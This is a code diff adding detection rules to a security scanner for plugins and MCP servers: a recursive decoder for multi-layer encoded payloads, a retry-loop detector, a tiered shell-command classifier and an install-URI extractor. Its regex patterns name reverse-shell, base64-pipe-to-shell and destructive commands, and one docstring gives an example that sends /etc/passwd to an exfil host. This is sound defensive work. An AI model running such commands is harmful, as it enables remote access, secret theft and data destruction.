@@ -13,6 +13,8 @@ All individual validators should import from this module to ensure consistency.
 
 from __future__ import annotations
 
+import base64 as _rc68_base64
+import binascii as _rc68_binascii
 import fnmatch
 import functools
 import getpass
@@ -2614,6 +2616,429 @@ register_rule(
         references=("skillscan MAL-051", "RC-71 sibling"),
         cwe="CWE-506",
         fp_guards=("Skip in test/doc files (RC-84)", "Skip in fenced code (RC-83)"),
+    )
+)
+
+
+# -----------------------------------------------------------------------------
+# RC-68 — Multi-layer encoding decoder (TRDD-0f1f7889 Phase 1 gap-fill, 2026-05-10)
+# -----------------------------------------------------------------------------
+# Source: aguara CRYPTO_002, vexscan EVASION_004, vetskill OBFUS_001
+# Attack: payload is encoded twice (or via two distinct schemes — base64 over
+# hex over url-quote) so a single-layer decoder used by RC-70 misses the
+# inner string. The detector recursively decodes up to MAX_DEPTH=4 layers
+# and inspects each intermediate decoding for exec/eval/shell sinks.
+#
+# Why distinct from RC-70: RC-70 fires on a SINGLE decoder near an exec
+# sink (proximity-based). RC-68 fires when the LITERAL ITSELF, recursively
+# decoded, contains a sink — even if the decoder call chain is split across
+# multiple lines or wrapped in helper functions.
+#
+# WARNING severity per TRDD §7 — promote after one minor of FP validation.
+# (imports `_rc68_base64` and `_rc68_binascii` declared at module top.)
+
+_RC68_MAX_DEPTH = 4
+_RC68_MIN_LENGTH = 16  # Skip tiny base64 strings (high-FP, low signal)
+_RC68_BASE64_PATTERN = re.compile(r"['\"]([A-Za-z0-9+/=]{16,})['\"]")
+_RC68_HEX_PATTERN = re.compile(r"['\"]([0-9a-fA-F]{32,})['\"]")
+# Decoder calls that signal "this string is going to be decoded at runtime"
+_RC68_DECODER_CALLS = re.compile(
+    r"\b(?:atob|base64\.b64decode|base64\.standard_b64decode|base64\.urlsafe_b64decode|"
+    r"Buffer\.from|bytes\.fromhex|codecs\.decode|binascii\.unhexlify|binascii\.a2b_hex|"
+    r"base64\.decodestring|base64\.decodebytes)\s*\("
+)
+# Sinks that, if found inside a decoded layer, escalate the finding.
+_RC68_SINK_RE = re.compile(
+    r"\b(?:eval\s*\(|exec\s*\(|system\s*\(|popen\s*\(|subprocess\.|child_process\.|"
+    r"Function\s*\(|os\.system|/dev/tcp|/bin/sh|/bin/bash)"
+)
+
+
+def _rc68_try_decode(literal: str) -> str | None:
+    """Try base64 then hex; return decoded text or None."""
+    # base64 attempt
+    try:
+        # validate=True rejects non-base64 alphabet noise quickly
+        decoded = _rc68_base64.b64decode(literal, validate=True)
+        text = decoded.decode("utf-8", errors="strict")
+        return text
+    except (ValueError, _rc68_binascii.Error, UnicodeDecodeError):
+        pass
+    # hex attempt
+    try:
+        decoded = bytes.fromhex(literal)
+        text = decoded.decode("utf-8", errors="strict")
+        return text
+    except (ValueError, UnicodeDecodeError):
+        pass
+    return None
+
+
+def detect_multilayer_encoded_payload(content: str) -> list[tuple[int, int, str]]:
+    """Return list of (line_number, layers, sink_match) for RC-68 findings.
+
+    A finding fires when:
+    1. A line contains a decoder call (atob, base64.b64decode, ...) AND
+    2. A literal string on or near that line, recursively decoded up to
+       MAX_DEPTH layers, reveals an exec/eval/shell sink.
+
+    Returns:
+        list of tuples: (line_number, layer_depth_at_which_sink_appeared,
+        first_60_chars_of_sink_match)
+    """
+    lines = content.split("\n")
+    findings: list[tuple[int, int, str]] = []
+    for idx, line in enumerate(lines):
+        # Phase 1: must have a decoder call on this line OR within ±2 lines
+        window_start = max(0, idx - 2)
+        window_end = min(len(lines), idx + 3)
+        window = "\n".join(lines[window_start:window_end])
+        if not _rc68_DECODER_PATTERN_search(window):
+            continue
+        # Phase 2: extract candidate literals from this line
+        candidates: list[str] = []
+        for m in _RC68_BASE64_PATTERN.finditer(line):
+            candidates.append(m.group(1))
+        for m in _RC68_HEX_PATTERN.finditer(line):
+            candidates.append(m.group(1))
+        for cand in candidates:
+            if len(cand) < _RC68_MIN_LENGTH:
+                continue
+            # Phase 3: recursive decode up to MAX_DEPTH layers
+            current = cand
+            for layer in range(1, _RC68_MAX_DEPTH + 1):
+                decoded = _rc68_try_decode(current)
+                if decoded is None:
+                    break
+                # Check for sinks in this decoded layer
+                sink_match = _RC68_SINK_RE.search(decoded)
+                if sink_match:
+                    findings.append((idx + 1, layer, sink_match.group(0)[:60]))
+                    break
+                # If the decoded layer itself looks like another base64/hex,
+                # try another decode round
+                if not (re.fullmatch(r"[A-Za-z0-9+/=\s]+", decoded) or re.fullmatch(r"[0-9a-fA-F\s]+", decoded)):
+                    break
+                # Strip whitespace for next round
+                current = re.sub(r"\s+", "", decoded)
+                if len(current) < _RC68_MIN_LENGTH:
+                    break
+    return findings
+
+
+def _rc68_DECODER_PATTERN_search(text: str) -> bool:  # noqa: N802
+    """Return True if `text` contains an RC-68 decoder call signature."""
+    return bool(_RC68_DECODER_CALLS.search(text))
+
+
+register_rule(
+    RuleSchema(
+        rule_id="RC-68",
+        name="Multi-layer encoded payload (recursive decode reveals sink)",
+        category="evasion",
+        severity="WARNING",  # Per TRDD §7 — promote to CRITICAL after FP validation
+        description=(
+            "A literal string near a decoder call, when decoded recursively "
+            f"up to {_RC68_MAX_DEPTH} layers, reveals an exec/eval/shell sink — "
+            "single-layer scanners miss this."
+        ),
+        references=("aguara CRYPTO_002", "vexscan EVASION_004", "vetskill OBFUS_001"),
+        cwe="CWE-506",
+        fp_guards=(
+            "Skip in test/doc files (RC-84)",
+            "Skip in fenced code blocks (RC-83)",
+            "Skip strings shorter than 16 chars (high FP rate)",
+            "Recursion bounded at MAX_DEPTH=4 (terminates on cycle/non-decodable)",
+        ),
+    )
+)
+
+
+# -----------------------------------------------------------------------------
+# RC-55 — MCP unbounded retry / rate-limit abuse (TRDD-0f1f7889 Phase 3 gap-fill)
+# -----------------------------------------------------------------------------
+# Source: aguara MCP-008, vexscan MCP-014
+# Attack: MCP server retries failed operations in a tight loop — used for
+# brute-forcing credentials, exhausting target rate limits, or keeping a
+# stuck connection alive forever. The classifier looks for:
+#   - `while True:` wrapping a network call with `continue` on exception
+#   - `for i in range(>=10000)` wrapping a network/exec call
+#   - Recursive function call in except handler with no decay/bound
+#
+# Bounded retries with exponential backoff (e.g. `for attempt in range(3)
+# ... time.sleep(2 ** attempt) ... break`) are NOT flagged.
+#
+# WARNING severity per TRDD §7.
+_RC55_NETWORK_OR_EXEC_RE = re.compile(
+    r"\b(?:requests\.(?:get|post|put|delete|head)|urllib\.request\.|urlopen\(|"
+    r"http\.client\.|fetch\s*\(|socket\.connect|subprocess\.(?:run|Popen|call)|"
+    r"os\.system|child_process\.exec)"
+)
+# Detect "for i in range(N)" with N >= 10000
+_RC55_HUGE_RANGE_RE = re.compile(r"\bfor\s+\w+\s+in\s+range\s*\(\s*(\d{5,})\s*[,)]")
+
+
+def detect_mcp_unbounded_retry(content: str) -> list[tuple[int, str]]:
+    """Return list of (line_number, reason) for RC-55 findings.
+
+    Detects:
+    - `while True:` blocks containing a network/exec call AND an except clause
+      with `continue` or `pass` (i.e. retry-on-error with no decay).
+    - `for i in range(BIG):` (>= 10000) loops containing a network/exec call.
+
+    Excludes bounded retries with `break` on success or with `time.sleep`
+    backoff — those are legitimate retry-with-backoff patterns.
+    """
+    lines = content.split("\n")
+    findings: list[tuple[int, str]] = []
+    n = len(lines)
+    i = 0
+    while i < n:
+        line = lines[i]
+        # Pattern A: `while True:`
+        if re.search(r"^\s*while\s+(?:True|1)\s*:\s*(?:#.*)?$", line):
+            # Look ahead up to 30 lines (typical loop body) to see if there's
+            # a network/exec call AND a continue/pass in an except handler.
+            block_end = min(i + 30, n)
+            block = "\n".join(lines[i:block_end])
+            has_network = bool(_RC55_NETWORK_OR_EXEC_RE.search(block))
+            has_except_continue = bool(re.search(r"except\b[^:]*:\s*\n\s+(?:continue|pass)\b", block))
+            has_break_or_return = bool(re.search(r"\b(?:break|return)\b", block))
+            # Fire only when we have BOTH network call AND retry-on-error pattern,
+            # AND no obvious termination break/return short-circuit on success.
+            if has_network and has_except_continue:
+                # Heuristic: if break/return appears INSIDE an except, it's the
+                # legitimate "give up after error" pattern; otherwise it's
+                # likely a "break on success" inside try — the retry-loop is
+                # genuinely unbounded.
+                if (
+                    not re.search(
+                        r"except\b[^:]*:[^\n]*(?:\n\s+[^\n]*)*?\n\s+(?:break|return)\b",
+                        block,
+                    )
+                    or not has_break_or_return
+                ):
+                    findings.append((i + 1, "while True with retry-on-error and no decay"))
+            i = block_end
+            continue
+        # Pattern B: `for i in range(BIG):`
+        m = _RC55_HUGE_RANGE_RE.search(line)
+        if m:
+            count = int(m.group(1))
+            if count >= 10000:
+                block_end = min(i + 30, n)
+                block = "\n".join(lines[i:block_end])
+                if _RC55_NETWORK_OR_EXEC_RE.search(block):
+                    findings.append((i + 1, f"for-range({count}) loop containing network/exec call"))
+            i = block_end
+            continue
+        i += 1
+    return findings
+
+
+register_rule(
+    RuleSchema(
+        rule_id="RC-55",
+        name="MCP unbounded retry / rate-limit abuse",
+        category="mcp",
+        severity="WARNING",
+        description=(
+            "MCP server contains a tight retry loop (`while True` + retry-on-error, "
+            "or `for i in range(>=10000)`) around a network/exec call — "
+            "credential brute-force or rate-limit exhaustion vector."
+        ),
+        references=("aguara MCP-008", "vexscan MCP-014"),
+        cwe="CWE-770",
+        fp_guards=(
+            "Bounded retries with exponential backoff are not flagged",
+            "Loops without network/exec calls are not flagged",
+            "Skip in test files (RC-84)",
+        ),
+    )
+)
+
+
+# -----------------------------------------------------------------------------
+# RC-82 — Tiered shell-command classifier (TRDD-0f1f7889 Phase 3d gap-fill)
+# -----------------------------------------------------------------------------
+# Source: aguara SUPPLY_010 (severity-bucket classifier)
+# Each shell command in a hook/agent body is classified into one of:
+#   - "tier0_safe": ls, cat, echo, pwd, date (read-only utilities)
+#   - "tier1_suspicious": curl, wget, ssh, nc, scp (network/external)
+#   - "tier2_dangerous": rm -rf, chmod, sudo, dd (destructive/privilege)
+#   - "tier3_critical": eval, exec, /dev/tcp, base64-pipe-sh (RCE primitives)
+#   - "unknown": unrecognized
+#
+# Used by callers (validate_hook.py, validate_agent.py) to attach a
+# severity tier to each shell-command finding instead of treating every
+# shell command identically.
+_RC82_TIER3_RE = re.compile(
+    r"(?:^|\s)(?:eval\s*\$\(|eval\s+`|exec\s+\d?(?:>|<)\s*/dev/tcp|"
+    r"bash\s+-i\s*>&\s*/dev/tcp|sh\s+-i\s*>&\s*/dev/tcp|"
+    r"\bbase64\s+-[dD]\b.*\|\s*(?:sh|bash|zsh)|"
+    r"\bxxd\s+-r\b.*\|\s*(?:sh|bash))"
+)
+_RC82_TIER2_RE = re.compile(
+    r"(?:^|\s)(?:rm\s+-[rRf]+|chmod\s+(?:[ugoa]?[+=][rwxsStTugo]+|[0-7]{3,4})|"
+    r"chown\s+|sudo\b|dd\s+if=|mkfs\b|fdisk\b|wipefs\b|shred\b|"
+    r"format\s+[A-Z]:|del\s+/[fsq]+)"
+)
+_RC82_TIER1_RE = re.compile(
+    r"(?:^|\s)(?:curl|wget|ssh|sftp|scp|nc|netcat|socat|"
+    r"git\s+clone|git\s+pull|git\s+push|"
+    r"npm\s+install|pip\s+install|pnpm\s+install|yarn\s+add|"
+    r"docker\s+pull|docker\s+run|podman\s+pull)\b"
+)
+_RC82_TIER0_RE = re.compile(
+    r"(?:^|\s)(?:ls|cat|echo|pwd|date|head|tail|grep|find|wc|"
+    r"sort|uniq|cut|awk|sed|tr|tee|"
+    r"basename|dirname|realpath|"
+    r"true|false|test|\[)\b"
+)
+
+
+def classify_shell_command_tier(cmd: str) -> str:
+    """Return tier label for a shell command string.
+
+    Tiers (ordered most-severe-first; first match wins):
+        - "tier3_critical"  — RCE primitives (eval pipe, /dev/tcp shell, base64-pipe-sh)
+        - "tier2_dangerous" — Destructive / privilege escalation (rm -rf, chmod, sudo)
+        - "tier1_suspicious" — Network / external interaction (curl, wget, ssh)
+        - "tier0_safe"      — Read-only utilities (ls, cat, echo, pwd)
+        - "unknown"         — Unrecognized command verb
+
+    The classifier is intentionally conservative — when a single command
+    line contains tokens from multiple tiers (e.g. `cat /etc/passwd | curl
+    -d @- http://exfil`), the highest tier wins.
+    """
+    if not cmd or not cmd.strip():
+        return "unknown"
+    if _RC82_TIER3_RE.search(cmd):
+        return "tier3_critical"
+    if _RC82_TIER2_RE.search(cmd):
+        return "tier2_dangerous"
+    if _RC82_TIER1_RE.search(cmd):
+        return "tier1_suspicious"
+    if _RC82_TIER0_RE.search(cmd):
+        return "tier0_safe"
+    return "unknown"
+
+
+register_rule(
+    RuleSchema(
+        rule_id="RC-82",
+        name="Tiered shell-command classifier",
+        category="hook-abuse",
+        severity="WARNING",
+        description=(
+            "Classify shell commands into 4 severity tiers (safe/suspicious/"
+            "dangerous/critical) so callers can apply proportional severity."
+        ),
+        references=("aguara SUPPLY_010",),
+        cwe="CWE-78",
+        fp_guards=(
+            "Tier0 (safe) commands produce no finding",
+            "Tier1+ commands inherit caller's existing severity policy",
+        ),
+    )
+)
+
+
+# -----------------------------------------------------------------------------
+# RC-107 — Pre-installation URI scan (TRDD-0f1f7889 Phase 5 gap-fill)
+# -----------------------------------------------------------------------------
+# Source: vexscan PREINSTALL-001, agentvet PREINSTALL-002
+# Extract install-target URIs from a plugin so a downstream tool (npm
+# audit, pip install --dry-run, oci scan) can pre-vet them without
+# executing the install.
+#
+# Returns a list of (kind, uri) tuples:
+#   - kind ∈ {"npm", "pypi", "oci", "git"}
+#   - uri is the package@version, image:tag, or repo URL
+#
+# Not registered as a finding-emitting rule — purely an extraction
+# helper consumed by Phase 5 specialist-tool delegation.
+_RC107_NPM_RE = re.compile(
+    r"\b(?:npm|pnpm|yarn)\s+(?:install|add|i)(?:\s+(?:-[a-zA-Z]+|--\S+))*\s+"
+    r"((?:@[a-zA-Z0-9_-]+/)?[a-zA-Z0-9_.-]+(?:@[\w.-]+)?)"
+)
+_RC107_NPX_RE = re.compile(r"\bnpx\s+(?:create-)?([a-zA-Z0-9_./@-]+)")
+_RC107_PIP_RE = re.compile(
+    r"\b(?:pip|pip3|pipx|uv\s+add|uv\s+pip\s+install)\s+(?:install\s+)?"
+    r"(?:(?:-[a-zA-Z]+|--\S+)\s+)*"
+    r"([a-zA-Z0-9_.-]+(?:[<>=!~]+[\w.*-]+)?)"
+)
+_RC107_DOCKER_FROM_RE = re.compile(r"^\s*FROM\s+([a-zA-Z0-9._/-]+(?::[\w.-]+)?)", re.MULTILINE)
+_RC107_DOCKER_PULL_RE = re.compile(
+    r"\b(?:docker|podman)\s+(?:pull|run)(?:\s+(?:-[a-zA-Z]+|--\S+))*\s+"
+    r"([a-zA-Z0-9._/-]+(?::[\w.-]+)?)"
+)
+
+
+def extract_install_uris(content: str) -> list[tuple[str, str]]:
+    """Extract install-target URIs from `content`.
+
+    Returns a list of (kind, uri) tuples where kind is one of
+    {"npm", "pypi", "oci", "git"} and uri is the install target.
+
+    Includes matches from comments and string literals — the caller is
+    expected to be a pre-installation scanner that wants the broadest
+    possible candidate list.
+    """
+    results: list[tuple[str, str]] = []
+    seen: set[tuple[str, str]] = set()
+
+    def _add(kind: str, uri: str) -> None:
+        # Dedupe and skip flag-looking false matches
+        uri = uri.strip().rstrip(",;.")
+        if not uri or uri.startswith("-"):
+            return
+        if (kind, uri) in seen:
+            return
+        seen.add((kind, uri))
+        results.append((kind, uri))
+
+    for m in _RC107_NPM_RE.finditer(content):
+        _add("npm", m.group(1))
+    for m in _RC107_NPX_RE.finditer(content):
+        _add("npm", m.group(1))
+    for m in _RC107_PIP_RE.finditer(content):
+        _add("pypi", m.group(1))
+    for m in _RC107_DOCKER_FROM_RE.finditer(content):
+        _add("oci", m.group(1))
+    for m in _RC107_DOCKER_PULL_RE.finditer(content):
+        _add("oci", m.group(1))
+    # Also catch `alpine:latest sh` / `python:3.12-slim` style lines that
+    # appeared in the test fixture without an explicit pull/FROM keyword.
+    # We use a wider catch-all only when the line contains a known image-tag
+    # shape and a runtime verb.
+    for line in content.split("\n"):
+        if re.search(r"\b(?:run|exec)\b", line, re.IGNORECASE):
+            for m in re.finditer(r"\b([a-z0-9][a-z0-9._-]*:[\w.-]+)\b", line):
+                tag = m.group(1)
+                # Reject host:port-looking strings (numeric after colon = port)
+                if not re.fullmatch(r"[a-z0-9][a-z0-9._-]*:\d+", tag):
+                    _add("oci", tag)
+
+    return results
+
+
+register_rule(
+    RuleSchema(
+        rule_id="RC-107",
+        name="Pre-installation URI extraction",
+        category="supply-chain",
+        severity="WARNING",
+        description=(
+            "Helper rule — extracts npm/pypi/oci install targets so a "
+            "downstream specialist tool can pre-vet them without execution."
+        ),
+        references=("vexscan PREINSTALL-001", "agentvet PREINSTALL-002"),
+        cwe="CWE-829",
+        fp_guards=(
+            "Helper-only — produces no findings on its own",
+            "Caller decides whether to enrich each URI with a remote-vet call",
+        ),
     )
 )
 
